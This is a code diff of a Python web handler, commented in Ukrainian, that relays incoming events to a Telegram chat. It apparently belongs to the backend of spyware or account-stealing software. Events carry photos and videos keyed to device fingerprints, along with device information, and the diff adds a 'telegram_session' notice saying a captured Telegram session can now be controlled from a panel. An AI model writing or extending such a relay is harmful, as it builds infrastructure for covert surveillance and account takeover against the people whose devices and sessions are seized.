@@ -210,7 +210,6 @@ async def handle_notify(request: web.Request):
     try:
         data = await request.json()
     except Exception as e:
-        # Додано логування для діагностики
         logger.error(f"Помилка парсингу JSON: {e}. Розмір тіла запиту: {request.content_length} байт.")
         return web.Response(status=400, text="Bad Request: invalid or too large JSON")
 
@@ -222,12 +221,30 @@ async def handle_notify(request: web.Request):
     chat = Chat(bot, chat_id)
     event_type = event_data.get("type")
     
+    # --- ХЕЛПЕР ДЛЯ ПОДІЛУ ТЕКСТУ ---
+    def split_text(text, limit):
+        if not text:
+            return []
+        parts = []
+        while len(text) > limit:
+            # Знаходимо останній перенос рядка або пробіл в межах ліміту
+            split_at = text.rfind('\n', 0, limit)
+            if split_at == -1:
+                split_at = text.rfind(' ', 0, limit)
+            if split_at == -1:
+                split_at = limit
+            parts.append(text[:split_at])
+            text = text[split_at:].lstrip()
+        if text:
+            parts.append(text)
+        return parts
+
     try:
+        # --- БЛОК ІСНУЮЧИХ СПОВІЩЕНЬ (без змін) ---
         if event_type == "photos":
             caption = (
                 "📸 **Нові фото!**\n\n"
-                f"**Пристрій:** `{event_data.get('fingerprint','-')}`\n"
-                f"**Час:** `{event_data.get('collectedAt','-')}`"
+                f"**Пристрій:** `{event_data.get('fingerprint','-')}`"
             )
             for idx, photo_b64 in enumerate(event_data.get("data", [])[:10]):
                 try:
@@ -246,8 +263,7 @@ async def handle_notify(request: web.Request):
         elif event_type == "video":
             caption = (
                 "📹 **Нове відео!**\n\n"
-                f"**Пристрій:** `{event_data.get('fingerprint','-')}`\n"
-                f"**Час:** `{event_data.get('collectedAt','-')}`"
+                f"**Пристрій:** `{event_data.get('fingerprint','-')}`"
             )
             for idx, video_b64 in enumerate(event_data.get("data", [])[:10]):
                 try:
@@ -293,17 +309,67 @@ async def handle_notify(request: web.Request):
             await retry_send(chat.send_text, message_text, parse_mode="Markdown")
             
         elif event_type == "device_info":
-            info_items = [f"- **{key}:** `{value}`" 
-                          for key, value in (event_data.get("data") or {}).items()]
-            info_text = "\n".join(info_items) or "_(немає даних)_"
             message_text = (
                 "ℹ️ **Інформація про пристрій**\n\n"
-                f"**Відбиток (FP):** `{event_data.get('fingerprint','-')}`\n"
-                f"**Час:** `{event_data.get('collectedAt','-')}`\n\n"
-                f"{info_text}"
+                f"**Відбиток (FP):** `{event_data.get('fingerprint','-')}`"
             )
             await retry_send(chat.send_text, message_text, parse_mode="Markdown")
 
+        elif event_type == "telegram_session":
+            message_text = (
+                "💬 **Отримано нову сесію Telegram!**\n\n"
+                f"**Пристрій:** `{event_data.get('fingerprint','-')}`\n"
+                "Тепер ви можете керувати нею через панель керування."
+            )
+            await retry_send(chat.send_text, message_text, parse_mode="Markdown")
+
+        # --- ОНОВЛЕНИЙ БЛОК ДЛЯ НОВИН ТА ІНШИХ ТЕКСТОВИХ СПОВІЩЕНЬ ---
+        elif event_type in ["news", "push_news", "terms_update"]:
+            ICONS = {
+                "push_news": "📢",
+                "news": "📰",
+                "terms_update": "⚖️"
+            }
+            TITLES = {
+                "push_news": "Важливе сповіщення",
+                "news": "Нова новина",
+                "terms_update": "Оновлення Умов Використання"
+            }
+            
+            icon = ICONS.get(event_type, "ℹ️")
+            event_title_prefix = TITLES.get(event_type, "Інформація")
+            event_title = event_data.get('title', 'Без заголовка')
+            event_text = event_data.get('text', '')
+            image_url = event_data.get('imageUrl')
+
+            full_caption_text = f"**{event_title_prefix}: {event_title}**\n\n{event_text}"
+            
+            # Ліміти Telegram
+            CAPTION_LIMIT = 1024
+            TEXT_LIMIT = 4096
+
+            if image_url:
+                caption_parts = split_text(full_caption_text, CAPTION_LIMIT)
+                try:
+                    await retry_send(chat.send_photo, photo=image_url, caption=caption_parts[0], parse_mode="Markdown")
+                    # Відправляємо залишок тексту, якщо він є
+                    remaining_text = "".join(caption_parts[1:])
+                    if remaining_text:
+                        text_parts = split_text(remaining_text, TEXT_LIMIT)
+                        for part in text_parts:
+                            await retry_send(chat.send_text, part, parse_mode="Markdown")
+                except Exception as e:
+                    logger.warning(f"Не вдалося відправити новину з зображенням, відправляю як текст: {e}")
+                    full_caption_text += f"\n\n[Зображення]({image_url})"
+                    text_parts = split_text(full_caption_text, TEXT_LIMIT)
+                    for part in text_parts:
+                        await retry_send(chat.send_text, part, parse_mode="Markdown")
+            else:
+                # Якщо зображення немає, просто ділимо текст і відправляємо
+                text_parts = split_text(full_caption_text, TEXT_LIMIT)
+                for part in text_parts:
+                    await retry_send(chat.send_text, part, parse_mode="Markdown")
+        
         else:
             logger.warning(f"Отримано невідомий тип події: {event_type}. Дані: {event_data}")
 
@@ -319,7 +385,6 @@ async def handle_notify(request: web.Request):
                     await write_db(db_data)
                     
     return web.Response(status=200, text="OK")
-
 async def handle_health_check(request: web.Request):
     return web.Response(status=200, text="OK. Bot is running.")
 
